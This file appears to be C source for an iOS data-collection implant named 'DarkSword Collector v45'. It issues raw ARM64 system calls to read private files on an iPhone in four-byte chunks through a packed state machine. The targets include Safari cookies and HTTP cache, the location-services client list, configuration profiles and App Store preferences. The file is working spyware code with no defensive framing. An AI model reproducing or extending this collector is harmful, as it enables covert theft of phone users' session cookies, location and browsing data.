/**
 * DarkSword Collector v45 - Scan system caches & shared containers
 * Uses proven plain C static volatile (v30 style)
 * Single file per call, state machine via g_offset packing
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define SYS_lseek 199
#define SEEK_SET 0
#define O_RDONLY 0

static volatile int g_ctx = 0;

#define NUM_FILES 12
#define CHUNKS_PER_FILE 5

static const char *get_path(int id) {
    switch (id) {
        case 0:  return "/var/mobile/Library/Caches/locationd/clients.plist";
        case 1:  return "/var/mobile/Library/Caches/com.apple.springboard.sharedimagecache.plist";
        case 2:  return "/var/mobile/Library/HTTPStorages/com.apple.mobilesafari/Cache.db";
        case 3:  return "/var/mobile/Library/Cookies/Cookies.binarycookies";
        case 4:  return "/var/mobile/Library/Preferences/com.apple.LaunchServices.plist";
        case 5:  return "/var/mobile/Library/Preferences/com.apple.preferences.sounds.plist";
        case 6:  return "/var/mobile/Library/SpringBoard/IconState.plist";
        case 7:  return "/var/mobile/Library/SpringBoard/LaunchMedias.plist";
        case 8:  return "/var/mobile/Library/ConfigurationProfiles/Settings.plist";
        case 9:  return "/var/mobile/Library/Preferences/com.apple.purplebuddy.plist";
        case 10: return "/var/mobile/Library/Preferences/com.apple.AppStore.plist";
        case 11: return "/etc/hosts";
        default: return (void*)0;
    }
}

int ds_start(void) {
    int ctx = g_ctx;
    int fid = (ctx >> 16) & 0xFF;
    int chk = ctx & 0xFF;

    if (fid >= NUM_FILES) { g_ctx = 0; return 0xFFFFFFFF; }
    if (chk >= CHUNKS_PER_FILE) { g_ctx = ((fid + 1) << 16); return 0xFF000000 | fid; }

    const char *path = get_path(fid);
    if (!path) { g_ctx = ((fid + 1) << 16); return 0xFD000000 | fid; }

    int fd = (int)_svc2(SYS_open, (long)path, O_RDONLY);
    if (fd < 0) { g_ctx = ((fid + 1) << 16); return 0xFE000000 | fid; }

    int off = chk * 4;
    if (off > 0) _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);

    g_ctx = (fid << 16) | (chk + 1);
    if (n < 1) return 0xEE000000 | fid;
    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}
